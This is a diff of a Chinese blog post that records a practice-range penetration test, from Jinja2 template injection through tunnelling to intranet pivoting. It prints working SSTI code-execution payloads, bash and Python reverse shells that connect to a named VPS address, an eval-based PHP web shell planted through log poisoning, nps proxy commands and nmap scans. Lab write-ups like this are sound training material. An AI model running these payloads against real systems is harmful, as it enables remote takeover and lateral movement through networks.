@@ -6,14 +6,16 @@
     <meta charset="utf-8">
     <meta name="keywords" content="渗透测试-欧拉, 学习记录">
     <meta name="description" content="
-过年的一次内网渗透
 
-外网打点
+过年的一次内网渗透。
 
-尝试模板注入：
 
-确认存在SSTI，网上找个payload试试：SSTI
-&amp;#123;&amp;#123; self._TemplateReference__context.cycler.__init__.__g">
+前言这是来自欧拉大佬的一个渗透测试靶场，开放了好多天，真的爱了。
+网络拓扑图
+linux-1（10.10.10.101）外网打点访问 linux-1对应的ip地址，回显页面如下：
+
+
+这个url参数以及回应头，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -470,21 +472,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-23
+                    2023-01-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    797
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    7 分
                 </div>
                 
 
@@ -508,49 +510,165 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-<p>过年的一次内网渗透</p>
+
+<p>过年的一次内网渗透。</p>
 <span id="more"></span>
-<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p><img src="/images/渗透测试-欧拉/image-20230122213642062.png" alt="image-20230122213642062"></p>
-<p><img src="/images/渗透测试-欧拉/image-20230122213728216.png" alt="image-20230122213728216"></p>
-<p>尝试模板注入：</p>
-<p><img src="/images/渗透测试-欧拉/image-20230122213746182.png" alt="image-20230122213746182"></p>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是来自欧拉大佬的一个渗透测试靶场，开放了好多天，真的爱了。</p>
+<h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128210859503.png" alt="image-20230128210859503"></p>
+<h3 id="linux-1101010101"><a href="#linux-1（10-10-10-101）" class="headerlink" title="linux-1（10.10.10.101）"></a>linux-1（10.10.10.101）</h3><h4 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h4><p>访问 linux-1对应的ip地址，回显页面如下：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213642062.png" alt="image-20230122213642062"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213728216.png" alt="image-20230122213728216"></p>
+<p>这个url参数以及回应头，很可能是模板注入，验证之后果然存在模板注入漏洞：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213746182.png" alt="image-20230122213746182"></p>
 <p>确认存在SSTI，网上找个payload试试：<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">SSTI</a></p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/渗透测试-欧拉/image-20230122213851444.png" alt="image-20230122213851444"></p>
-<p>root 权限！尝试弹 shell 吧</p>
-<p>有以下两种方式：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.xxx).read() &#125;&#125;&amp;xxx&#x3D;curl baidu.com &#x2F;&#x2F;先用baidu.com测试一下命令是否成功执行以及机器能否出网，之后换成反弹shell的命令就好<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/渗透测试-欧拉/image-20230122214203550.png" alt="image-20230122214203550"></p>
-<p>可以看到这台机器是可以出网的，接下来我们直接弹 shell，不过在那之前先使用 nps 给我们本地的kali弄一个端口转发</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.xxx).read()&#125;&#125;&amp;xxx&#x3D;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.115.222.18&#x2F;12345 0&gt;&amp;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>糟糕地是，我的vps好像用不了上面的方法，直接用python反弹shell</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;121.37.186.22&#x2F;?name&#x3D;&#123;&#123;url_for.__globals__.os.__dict__.popen(&quot;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;47.115.222.18\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>反弹之后运行如下命令模拟一个终端设备</p>
-<pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">bash
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122213851444.png" alt="image-20230122213851444"></p>
+<p>root 权限！所以不需要提权，先检查一下这台机器是否能出网。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.xxx).read() &#125;&#125;&amp;xxx&#x3D;curl baidu.com &#x2F;&#x2F;先用baidu.com测试一下命令是否成功执行以及机器能否出网，之后换成反弹shell的命令就好<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122214203550.png" alt="image-20230122214203550"></p>
+<p>可以看到这台机器是可以出网的，接下来我们直接弹 shell，不过在那之前先使用 nps 给我们本地的 kali 弄一个端口转发。</p>
+<p>vps 上运行nps服务器：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128211718974.png" alt="image-20230128211718974"></p>
+<blockquote>
+<p>若是报端口被占用，用 asof -i:端口号 查询对应进程，然后kill掉就可以了。</p>
+</blockquote>
+<p>虚拟机中的 kali 运行 nps 客户端连接服务器：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.&#x2F;npc -server&#x3D;47.115.222.18:8024 -vkey&#x3D;123456 -type&#x3D;tcp <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128212358257.png" alt="image-20230128212358257"></p>
+<p>然后访问 <code>http://47.115.222.18:8080/login/index</code> 添加客户端</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128213219769.png" alt="image-20230128213219769"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128212856202.png" alt="image-20230128212856202"></p>
+<p>给上一步添加的客户端建立tcp隧道</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128213331554.png" alt="image-20230128213331554"></p>
+<p>经过以上操作，访问 vps 的 12345 端口的流量就可以转到我们的 kali 的 12345 端口来啦~</p>
+<p>反弹 shell 的 payload：</p>
+<p>kali：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash
 nc -lvp 12345
 python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;
 ctrl z
 stty raw -echo
 fg
 export TERM&#x3D;xterm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>成功拿下第一台靶机</p>
-<p><img src="/images/渗透测试-欧拉/image-20230122221102357.png" alt="image-20230122221102357"></p>
-<p>看一下这台机器的网络</p>
-<p><img src="/images/渗透测试-欧拉/image-20230122221158065.png" alt="image-20230122221158065"></p>
-<p>传一个 nmap 上去对内网的其他主机进行扫描，用到的 nmap 来自<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">andrew-d</a></p>
-<p>这里同样再开一个 nps 代理（端口8001），先将 nmap 下载到本地的 kali，然后直接让这台机器 curl 我们的 vps 就可以了。具体操作如下</p>
-<pre class="line-numbers language-none"><code class="language-none">cd ~
-mkdir www
-cd www
+
+<p>网页输入 payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.xxx).read()&#125;&#125;&amp;xxx&#x3D;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.115.222.18&#x2F;12345 0&gt;&amp;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>糟糕地是，我的 vps 好像用不了上面的方法，直接用 python 反弹 shell</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://121.37.186.22/?name=&#123;&#123;url_for.__globals__.os.__dict__.popen("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"47.115.222.18\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128214121368.png" alt="image-20230128214121368"></p>
+<p>成功拿下第一台靶机！</p>
+<h4 id="查看本机网络信息"><a href="#查看本机网络信息" class="headerlink" title="查看本机网络信息"></a>查看本机网络信息</h4><pre class="line-numbers language-none"><code class="language-none">ip addr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230122221158065.png" alt="image-20230122221158065"></p>
+<h4 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h4><p>传一个 nmap 上去对内网的其他主机进行扫描，用到的 nmap 来自 <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">andrew-d</a>。为了让服务器能够下载到我们本地 kali 上的 nmap ，需要再建立一个 tcp 隧道（在kali），端口号选择 8001。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128214824031.png" alt="image-20230128214824031"></p>
+<p>先将 nmap 下载到本地的 kali，然后直接让这台机器 curl 我们的 vps 就可以了。kali 上的具体操作如下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd ~
+mkdir euler1
+cd euler1
 cp ..&#x2F;npc npc
 cp ..&#x2F;nmap nmap
 python -m http.server 8001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>反弹shell的操作如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;dev&#x2F;shm
+curl -o nmap http:&#x2F;&#x2F;47.115.222.18:8001&#x2F;nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>总体结果如下图：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128215221956.png" alt="image-20230128215221956">	<img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128215236050.png" alt="image-20230128215236050"></p>
+<p>用 MD5 校验一下</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128222101160.png" alt="image-20230128222101160"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128222113483.png" alt="image-20230128222113483"></p>
+<p>之后加上执行权限</p>
+<pre class="line-numbers language-none"><code class="language-none">chmod +x .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128215338977.png" alt="image-20230128215338977"></p>
+<p>接下来直接运行nmap扫描内网存活的主机就可以了。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir logs
+.&#x2F;nmap -sP -oA logs&#x2F;alive 10.10.10.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128215542110.png" alt="image-20230128215542110"></p>
+<p>发现内网的存活主机如下：</p>
+<blockquote>
+<p>10.10.10.101</p>
+<p>10.10.10.102</p>
+<p>10.10.10.200</p>
+<p>10.10.10.201</p>
+</blockquote>
+<h3 id="linux-2101010101"><a href="#linux-2（10-10-10-101）" class="headerlink" title="linux-2（10.10.10.101）"></a>linux-2（10.10.10.101）</h3><h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><p>nmap 扫一下这台机器开放了什么端口和服务。（为了加快速度，可以设置一下速率！）</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;nmap -v --min-rate&#x3D;10000 -oA logs&#x2F;10.101 10.10.10.101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128220903092.png" alt="image-20230128220903092"></p>
+<p>开放了80和22端口，这应该是一个内网的web服务器。为了方便访问，我们再上线一个 nps client（linux-1作为客户端），方便对内网靶机进行后续操作。</p>
+<h4 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h4><p>先把 nps 的客户端文件传到 linux-1 上</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m http.server #kali
+curl -o npc http:&#x2F;&#x2F;47.115.222.18:8001&#x2F;npc #linux-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128222554073.png" alt="image-20230128222554073"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128222621649.png" alt="image-20230128222621649"></p>
+<p>接着nps服务器配置新客户端：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128221219724.png" alt="image-20230128221219724"></p>
+<p>最后在linux-1上运行命令连接nps服务器，这里为了方便操作，让其后台运行。</p>
+<pre class="line-numbers language-none"><code class="language-none">nohup .&#x2F;npc -server&#x3D;47.115.222.18:8024 -vkey&#x3D;u2eymyy1a348woh1 -type&#x3D;tcp &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128222908464.png" alt="image-20230128222908464"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128223250347.png" alt="image-20230128223250347"></p>
+<p>如此一来，我们就在自己的vps和linux-1上建立了连接，要想在本地kali上通过浏览器访问到linux-2的web网页，还需要配置socks代理。</p>
+<p>那我们紧接着给这个 nps client 配置 socks 代理</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128221351671.png" alt="image-20230128221351671"></p>
+<p>最后在我们的kali上配置socks代理文件</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo vim &#x2F;etc&#x2F;proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>添加 <code>socks5 47.115.222.18 7001</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128223714421.png" alt="image-20230128223714421"></p>
+<p>查看socks代理是否成功：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128223806464.png" alt="image-20230128223806464"></p>
+<p>成功代理！！！最后再设置一下 kali 的 burp ，让它走socks代理，然后burp再代理浏览器，这样就可以通过浏览器访问 10.10.10.101 了。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128224427431.png" alt="image-20230128224427431"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128224449131.png" alt="image-20230128224449131"></p>
+<h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><p>在 kali 的浏览器访问 10.10.10.101 </p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128224617537.png" alt="image-20230128224617537"></p>
+<p>随便点一张图片发现：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128224652119.png" alt="image-20230128224652119"></p>
+<p>很可能存在文件包含漏洞，尝试一下</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128224719744.png" alt="image-20230128224719744"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128225140244.png" alt="image-20230128225140244"></p>
+<p>发现服务器是 nginx，php 的版本是 5.4.16，所以可以试试通过包含 nginx 的日志文件来 getShell。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128225255392.png" alt="image-20230128225255392"></p>
+<p>发现是可以的，那我们直接传一个包含木马的请求就好了。</p>
+<p>在 User-Agent 头中写 webShell</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;include.php?file&#x3D;&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1
+
+User-Agent: &lt;?php @eval($_REQUEST[1])?&gt;
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后包含日志文件</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128225703053.png" alt="image-20230128225703053"></p>
+<p>发现成功包含到 WebShell，接下来我们直接弹 shell 到 linux-1 的 9002 端口上。（因为 linux-2 不能出网）</p>
+<p>为提升反弹 shell 的成功率，故采用 base64 编码 payload</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.100&#x2F;9002 0&gt;&amp;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128231243601.png" alt="image-20230128231243601"></p>
+<p>为了将 linux-1 上的 shell 弄到我们本地的 kali 上来，要在 nps 服务器上新建一个 p2p 连接(注意是在test 客户端上)。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%AC%A7%E6%8B%89/image-20230128233119721.png" alt="image-20230128233119721"></p>
+<pre class="line-numbers language-none"><code class="language-none">nohup .&#x2F;npc -server&#x3D;47.115.222.18:8024 -vkey&#x3D;123456 -type&#x3D;tcp -password&#x3D;hhh -target&#x3D;9004 -local_port&#x3D;9004 &amp; #这里注意要加-local_port，默认是2000，好像已被使用。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="阿里云服务器"><a href="#阿里云服务器" class="headerlink" title="阿里云服务器"></a>阿里云服务器</h4><p>阿里云服务器老是自动断开连接，真的很烦人！可以根据这个链接配置一下：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lu_embedded/article/details/78870019">https://blog.csdn.net/lu_embedded/article/details/78870019</a></p>
 <h4 id="安装-nps"><a href="#安装-nps" class="headerlink" title="安装 nps"></a>安装 nps</h4><p>把 vps 服务器的流量转到我们的本地kali上来。</p>
 <p><a target="_blank" rel="noopener" href="https://www.moewah.com/archives/842.html">https://www.moewah.com/archives/842.html</a></p>
-<h3 id="如何获取到一个真正的shell终端"><a href="#如何获取到一个真正的shell终端" class="headerlink" title="如何获取到一个真正的shell终端"></a>如何获取到一个真正的shell终端</h3><p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
-<pre class="line-numbers language-none"><code class="language-none">bash &#x2F;&#x2F;一定要进bash！
+<h4 id="如何获取到一个真正的shell终端"><a href="#如何获取到一个真正的shell终端" class="headerlink" title="如何获取到一个真正的shell终端"></a>如何获取到一个真正的shell终端</h4><p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40572277/article/details/104990616?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-104990616-blog-126389028.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=1">Linux中使用ctrl+z停止任务后如何恢复任务</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash &#x2F;&#x2F;一定要进bash！
 nc -lvp 9001
 python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
 ctrl Z
@@ -559,18 +677,15 @@ fg
 export TERM&#x3D;xterm
 stty rows xx columns xxx
 reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h4 id="python-反弹shell"><a href="#python-反弹shell" class="headerlink" title="python 反弹shell"></a>python 反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;121.37.186.22&#x2F;?name&#x3D;&#123;&#123;url_for.__globals__.os.__dict__.popen(&quot;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;47.115.222.18\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h5 id="当前ip"><a href="#当前ip" class="headerlink" title="当前ip"></a>当前ip</h5><p><img src="/images/渗透测试-欧拉/image-20230120181158143.png" alt="image-20230120181158143"></p>
-<h5 id="内核信息"><a href="#内核信息" class="headerlink" title="内核信息"></a>内核信息</h5><p>发现是红帽</p>
-<p><img src="/images/渗透测试-欧拉/image-20230120181322429.png" alt="image-20230120181322429"></p>
-<h3 id="nmap扫描内网存活主机"><a href="#nmap扫描内网存活主机" class="headerlink" title="nmap扫描内网存活主机"></a>nmap扫描内网存活主机</h3><pre class="line-numbers language-none"><code class="language-none">mkdir logs
-.&#x2F;nmap -sP -oA logs&#x2F;alive 10.10.10.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/渗透测试-欧拉/image-20230122232232261.png" alt="image-20230122232232261"></p>
-<p>之后对存活的主机分别进行扫描</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;nmap -v --min-rate&#x3D;10000 -oA logs&#x2F;10.101 10.10.10.101
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/渗透测试-欧拉/image-20230122232533975.png" alt="image-20230122232533975"></p>
-<p>80 是 http 服务器，设置一下 kali 的 burp ，让它走socks代理，然后burp再代理浏览器，这样就可以通过浏览器访问 10.10.10.101 了。</p>
+
+
+
+
+
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/332083.html">Linux内网渗透——Linux信息收集与横向移动 - FreeBuf网络安全行业门户</a></p>
 
                 
@@ -1099,7 +1214,7 @@ reset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">259.7k</span>
+                        class="white-color">265.2k</span>
             
             
             
